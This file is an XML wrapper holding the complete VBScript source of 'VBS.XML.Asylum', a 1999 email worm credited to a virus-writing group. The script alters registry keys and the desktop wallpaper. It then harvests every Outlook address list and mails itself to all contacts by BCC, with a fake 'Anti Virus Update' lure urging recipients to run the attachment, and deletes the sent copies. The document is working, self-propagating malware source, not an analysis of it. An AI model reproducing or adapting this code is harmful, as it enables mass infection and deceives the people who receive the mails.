<?xml version="1.0"?>
<?xml:stylesheet type="text/xsl" href="Asylum.xsl"?>
<Asylum>
  <pagename>Asylum</pagename>
  <VBS name="Asylum">
    <code>
      <scrpt>
' VBS.XML.Asylum
' Coded by Ruzz`
' The Shadow Virus Group
' http://www.virusexchange.org/shadowvx

' Begin code
On Error Resume Next
Set Asylumfso = CreateObject("Scripting.FileSystemObject")
Set AsylumReg = CreateObject("WScript.Shell")

' -----
Const WindowsFolder = 0, SystemFolder = 1, TemporaryFolder = 2
' -----
RegAuthor = AsylumReg.RegRead("HKEY_LOCAL_MACHINE\Software\Asylum\Info\Coder")
If RegAuthor = "Ruzz`" Then
Else
AsylumReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Asylum\Info\Coder", "Ruzz`"
AsylumReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Asylum\Info\Group", "The Shadow Virus Group"
AsylumReg.RegWrite "HKEY_LOCAL_MACHINE\Software\Asylum\Info\Release", "Asylum 1.0"
End If

RegActive = AsylumReg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper")
If RegActive <> "" Then
Set Asylumhtml = Asylumfso.CreateTextFile("c:\Windows\Web\Wallpaper\Asylum.html", True)
Asylumhtml.WriteLine "<html><head></head>"
Asylumhtml.WriteLine "<!-- VBS.XML.Asylum -->"
Asylumhtml.WriteLine "<!-- Coded by Ruzz` 1999-->"
Asylumhtml.WriteLine "<!-- The Shadow Virus Group -->"
Asylumhtml.WriteLine "<body id=bodytag scroll=no style=" & Chr(34) & "background: black; margin: 0; font: 8pt Verdana" & Chr(34) & ">"
Asylumhtml.WriteLine "<table id=tabletag border=0 height=100% width=100% cellpadding=0 cellspacing=0 style=" & Chr(34) & "font: 8pt Verdana" & Chr(34) & ">"
Asylumhtml.WriteLine "<tr valign=bottom>"
Asylumhtml.WriteLine "<td id=tabledata align=right>"
Asylumhtml.WriteLine "<span style=" & Chr(34) & "position: relative; left: -75pt; letter-spacing: -4px; font: 41pt verdana; font-weight: bold; color: #424242" & Chr(34) & ">Asylum"
Asylumhtml.WriteLine "<span style=" & Chr(34) & "font: 12pt Verdana; letter-spacing:	0; color: Orange; font-weight: bold" & Chr(34) & ">Hope your still sane!</span>"
Asylumhtml.WriteLine "</span>"
Asylumhtml.WriteLine "<br>"
Asylumhtml.WriteLine "<br>"
Asylumhtml.WriteLine "</td></tr></table></body></html>"
Asylumhtml.Close
AsylumReg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", "C:\WINDOWS\WEB\Wallpaper\Asylum.html"
Else
AsylumReg.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", "c:\windows\Setup.bmp"
End If
' ----- Thanks to Zulu for the following code  :)
Set AsylumO = CreateObject("Outlook.Application")
Set AsylumMAPI = AsylumO.GetNameSpace("MAPI")
For Each AsylumAddy In AsylumMAPI.AddressLists
If AsylumAddy.AddressEntries.Count <> 0 Then
Set AsylumCI = AsylumO.CreateItem(0)
For AsylumLoop = 1 To AsylumAddy.AddressEntries.Count
Set AsylumCount = AsylumAddy.AddressEntries(AsylumLoop)
If AsylumLoop = 1 Then
AsylumCI.BCC = AsylumCount.Address
Else
AsylumCI.BCC = AsylumCI.BCC & "; " & AsylumCount.Address
End If
Next
AsylumCI.Subject = "Anti Virus Update Program"
AsylumCI.Body = "If you have an Anti Virus program, NOW IS THE TIME TO UPGRADE!  To do so, run the attached file.  If you do not have an Anti Virus program, this file will install one for you!  You have nothing to loose!"
AsylumCI.Attachments.Add Asylumfso.BuildPath(Asylumfso.GetSpecialFolder(2),"VBS.XML.Asylum.VBS")
AsylumCI.DeleteAfterSubmit = True
AsylumCI.Send
' End Of Code
      </scrpt>
    </code>
  </VBS>
</Asylum>
